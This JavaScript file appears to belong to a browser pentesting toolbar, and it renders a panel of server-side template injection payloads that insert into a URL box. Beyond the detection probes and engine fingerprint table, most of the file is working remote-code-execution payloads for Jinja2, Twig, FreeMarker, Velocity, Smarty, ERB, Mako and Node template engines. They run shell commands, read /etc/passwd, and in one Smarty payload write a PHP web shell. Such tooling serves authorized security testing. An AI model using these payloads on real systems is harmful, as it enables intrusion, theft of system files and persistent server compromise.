// ============================================================
// ssti.js - SSTI detection + fingerprint + per-engine exploitation
// ============================================================
// Workflow (like Burp / tplmap):
//   1. Fire a detection probe ({{7*7}}, ${7*7}, <%= 7*7 %>, ...).
//   2. Read the response and use the fingerprint table to identify the
//      template engine (e.g. 49 vs 7777777 vs literal text).
//   3. Use that engine's section to read config / get RCE.
//
// Buttons insert their payload into the URL box at the cursor.

window.KHackBar = window.KHackBar || {};
window.KHackBar.Ssti = window.KHackBar.Ssti || {};

window.KHackBar.Ssti.render = function (panel, urlBox) {
  if (!panel || !urlBox || !window.KHackBar.UI) return;
  while (panel.firstChild) panel.removeChild(panel.firstChild);
  panel.style.flexDirection = 'column';

  function heading(title) {
    var h = document.createElement('div');
    h.className = 'settings-section-title';
    h.textContent = title;
    return h;
  }
  function row() {
    var r = document.createElement('div');
    r.style.cssText = 'display:flex; flex-wrap:wrap; gap:4px; margin-bottom:8px; width:100%;';
    return r;
  }
  function note(text, color) {
    var d = document.createElement('div');
    d.style.cssText = 'width:100%; font-size:10px; color:' + (color || '#a3a3a3') + '; margin-bottom:8px; line-height:1.5;';
    d.textContent = text;
    return d;
  }
  function section(title, payloads) {
    var sec = document.createElement('div');
    sec.style.width = '100%';
    sec.appendChild(heading(title));
    var r = row();
    payloads.forEach(function (p) {
      r.appendChild(window.KHackBar.UI.createPayloadButton(p, p, 'ssti_panel', urlBox));
    });
    sec.appendChild(r);
    panel.appendChild(sec);
  }

  panel.appendChild(note('SSTI workflow: 1) fire a detection probe, 2) match the response against the fingerprint table below, 3) use that engine\'s section to read config / get RCE. Buttons insert at the cursor in the URL box.'));

  // ---- 1. Detection probes ----
  section('① Detection probes', [
    '{{7*7}}',
    '{{7*\'7\'}}',
    '${7*7}',
    '#{7*7}',
    '*{7*7}',
    '<%= 7*7 %>',
    '@(7*7)',
    '#{ 7 * 7 }',
    '{{7*7}}${7*7}<%= 7*7 %>#{7*7}',
    '${{<%[%\'"}}%\\'
  ]);

  // ---- Fingerprint reference table ----
  var fpWrap = document.createElement('div');
  fpWrap.style.cssText = 'width:100%; border:1px dashed #3f3f3f; border-radius:4px; padding:8px; margin-bottom:10px;';
  fpWrap.appendChild(heading('Fingerprint: response → engine'));
  var rows = [
    ['{{7*7}} → 49', 'Jinja2 (Python) or Twig (PHP) — disambiguate below'],
    ['{{7*\'7\'}} → 7777777', 'Jinja2 (Python / Flask)'],
    ['{{7*\'7\'}} → 49', 'Twig (PHP)'],
    ['${7*7} → 49', 'FreeMarker / Java EL (JSP, Spring) / Velocity'],
    ['#{7*7} → 49', 'Ruby (Slim/…) or JSF/Thymeleaf EL'],
    ['<%= 7*7 %> → 49', 'ERB (Ruby) or EJS (Node.js)'],
    ['@(7*7) → 49', 'Razor (.NET)'],
    ['{{7*7}} → {{7*7}} (unchanged)', 'Not vulnerable / not that engine — try another probe'],
    ['a{*b*}c → ac', 'Smarty (PHP)']
  ];
  rows.forEach(function (pair) {
    var line = document.createElement('div');
    line.style.cssText = 'font-size:11px; margin:2px 0; line-height:1.45;';
    var k = document.createElement('span');
    k.style.cssText = 'color:#22c55e; font-weight:bold;';
    k.textContent = pair[0];
    var v = document.createElement('span');
    v.style.cssText = 'color:#a3a3a3;';
    v.textContent = '  →  ' + pair[1];
    line.appendChild(k);
    line.appendChild(v);
    fpWrap.appendChild(line);
  });
  panel.appendChild(fpWrap);

  // ---- 2. Per-engine exploitation ----
  section('② Jinja2 / Python (Flask)', [
    '{{config}}',
    '{{config.items()}}',
    '{{self.__init__.__globals__}}',
    '{{request.application.__globals__.__builtins__}}',
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{%print(7*7)%}"
  ]);

  section('③ Twig (PHP)', [
    '{{7*7}}',
    '{{_self}}',
    '{{dump(app)}}',
    "{{['id']|filter('system')}}",
    "{{['id',''] |sort('system')}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{['cat /etc/passwd']|filter('system')}}"
  ]);

  section('④ FreeMarker (Java)', [
    '${7*7}',
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '${"freemarker.template.utility.Execute"?new()("id")}',
    '${product.getClass().getProtectionDomain()}',
    '[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}'
  ]);

  section('⑤ Velocity (Java)', [
    '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")',
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))$rt.getRuntime().exec('id')"
  ]);

  section('⑥ Smarty (PHP)', [
    '{$smarty.version}',
    "{php}system('id');{/php}",
    "{system('id')}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET[0]); ?>',self::clearConfig())}"
  ]);

  section('⑦ ERB / Ruby', [
    '<%= 7*7 %>',
    "<%= system('id') %>",
    '<%= `id` %>',
    "<%= IO.popen('id').read %>",
    "<%= File.open('/etc/passwd').read %>"
  ]);

  section('⑧ Mako / Python', [
    "${7*7}",
    "${__import__('os').popen('id').read()}",
    "<%import os%>${os.popen('id').read()}",
    "${self.module.cache.util.os.system('id')}"
  ]);

  section('⑨ Node (Jade/Pug, EJS, Handlebars)', [
    '#{7*7}',
    "#{root.process.mainModule.require('child_process').execSync('id')}",
    "<%= global.process.mainModule.require('child_process').execSync('id') %>"
  ]);
};
